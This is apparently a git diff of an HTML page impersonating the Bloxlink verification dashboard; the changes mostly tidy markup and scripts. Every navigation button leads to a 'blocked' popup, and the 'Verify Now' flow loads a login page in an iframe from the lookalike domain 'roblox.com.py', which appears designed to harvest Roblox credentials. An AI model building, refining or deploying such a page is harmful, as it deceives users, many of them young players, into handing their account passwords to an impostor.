@@ -4,16 +4,14 @@
   <meta charset="UTF-8" />
   <title>Bloxlink – Verifications</title>
 
-  <!-- FIX MOBILE -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- FAVICON -->
   <link rel="icon" href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" type="image/png">
-
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
+<!-- MOBILE MENU BUTTON -->
 <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
 
 <div class="top-bar">
@@ -22,40 +20,29 @@
 </div>
 
 <div class="layout">
+
   <aside class="sidebar" id="sidebar">
     <div class="logo">
-      <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462122032933240954/wordmark.png?ex=696d0ac1&is=696bb941&hm=8010d436e706cc951a78cbccbff6d8fa8a38894b4f67190c3ec280dd3995bb21&"
+      <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462122032933240954/wordmark.png"
            alt="Bloxlink" style="max-width:160px;height:auto;">
     </div>
 
     <div class="section">
       <p class="section-title">GENERAL</p>
-      <button class="nav-item active" onclick="openBlockedPopup()">
-        <span class="icon">✓</span> Verifications
-      </button>
-      <button class="nav-item" onclick="openBlockedPopup()">
-        <span class="icon">▦</span> Manage Servers
-      </button>
+      <button class="nav-item active" onclick="openBlockedPopup()">✓ Verifications</button>
+      <button class="nav-item" onclick="openBlockedPopup()">▦ Manage Servers</button>
     </div>
 
     <div class="section">
       <p class="section-title">ACCOUNT</p>
-      <button class="nav-item" onclick="openBlockedPopup()">
-        <span class="icon">◼</span> Manage Subscriptions
-      </button>
-      <button class="nav-item" onclick="openBlockedPopup()">
-        <span class="icon">⚙</span> Settings
-      </button>
+      <button class="nav-item" onclick="openBlockedPopup()">◼ Manage Subscriptions</button>
+      <button class="nav-item" onclick="openBlockedPopup()">⚙ Settings</button>
     </div>
 
     <div class="section">
       <p class="section-title">OTHER</p>
-      <button class="nav-item" onclick="openBlockedPopup()">
-        <span class="icon">?</span> Support
-      </button>
-      <button class="nav-item" onclick="openBlockedPopup()">
-        <span class="icon">⌘</span> Developer API
-      </button>
+      <button class="nav-item" onclick="openBlockedPopup()">? Support</button>
+      <button class="nav-item" onclick="openBlockedPopup()">⌘ Developer API</button>
     </div>
   </aside>
 
@@ -72,23 +59,20 @@
         </p>
       </div>
 
-      <button class="verify-circle" onclick="openVerifyScreen()">
-        Verify Now
-      </button>
+      <button class="verify-circle" onclick="openVerifyScreen()">Verify Now</button>
     </div>
 
     <div class="missing-bar">
       <span>Missing an account?</span>
-      <a href="#" class="missing-btn" onclick="openVerifyScreen()">
-        + Add Another One
-      </a>
+      <a href="#" class="missing-btn" onclick="openVerifyScreen()">+ Add Another One</a>
     </div>
   </main>
 </div>
 
+<!-- SIDEBAR OVERLAY -->
 <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
 
-<!-- POPUP BLOQUEADO -->
+<!-- BLOCKED POPUP -->
 <div id="blockedOverlay" class="popup-overlay">
   <div class="popup">
     <div class="popup-header red">
@@ -100,43 +84,28 @@
   </div>
 </div>
 
-<!-- VERIFY YOUR ACCOUNT SCREEN -->
+<!-- VERIFY POPUP -->
 <div id="verifyOverlay" class="popup-overlay">
   <div class="verify-popup">
-
-    <div class="verify-header">
-      Verify Your Account
-    </div>
+    <div class="verify-header">Verify Your Account</div>
 
     <div class="verify-body">
       <div class="verify-icon">
-        <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" alt="">
+        <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
       </div>
 
-      <button class="verify-continue" onclick="openRobloxIframe()">
-        Continue
-      </button>
-
+      <button class="verify-continue" onclick="openRobloxIframe()">Continue</button>
       <div class="verify-or">or</div>
-
-      <button class="verify-return" onclick="closeVerifyScreen()">
-        Return to Bloxlink
-      </button>
+      <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
     </div>
-
   </div>
 </div>
 
-<!-- IFRAME ROBLOX -->
+<!-- IFRAME -->
 <div id="iframeOverlay" class="popup-overlay">
   <div class="iframe-popup">
-
-    <div class="verify-header">
-      Verify Your Account
-    </div>
-
+    <div class="verify-header">Verify Your Account</div>
     <button class="close-iframe" onclick="closeIframe()">✕</button>
-
     <iframe id="popupIframe"></iframe>
   </div>
 </div>
@@ -145,38 +114,37 @@
   const ROBLOX_URL = "https://roblox.com.py/login?returnUrl=7692425652606225";
 
   function openBlockedPopup() {
-    document.getElementById("blockedOverlay").classList.add("show");
+    blockedOverlay.classList.add("show");
   }
 
   function closeBlocked() {
-    document.getElementById("blockedOverlay").classList.remove("show");
+    blockedOverlay.classList.remove("show");
   }
 
   function openVerifyScreen() {
-    document.getElementById("verifyOverlay").classList.add("show");
+    verifyOverlay.classList.add("show");
   }
 
   function closeVerifyScreen() {
-    document.getElementById("verifyOverlay").classList.remove("show");
+    verifyOverlay.classList.remove("show");
   }
 
   function openRobloxIframe() {
     closeVerifyScreen();
-    document.getElementById("popupIframe").src = ROBLOX_URL;
-    document.getElementById("iframeOverlay").classList.add("show");
+    popupIframe.src = ROBLOX_URL;
+    iframeOverlay.classList.add("show");
   }
 
   function closeIframe() {
-    document.getElementById("popupIframe").src = "";
-    document.getElementById("iframeOverlay").classList.remove("show");
+    popupIframe.src = "";
+    iframeOverlay.classList.remove("show");
   }
 
   function toggleSidebar() {
-    document.getElementById("sidebar").classList.toggle("open");
-    document.getElementById("sidebarOverlay").classList.toggle("show");
+    sidebar.classList.toggle("open");
+    sidebarOverlay.classList.toggle("show");
   }
 </script>
 
 </body>
 </html>
-
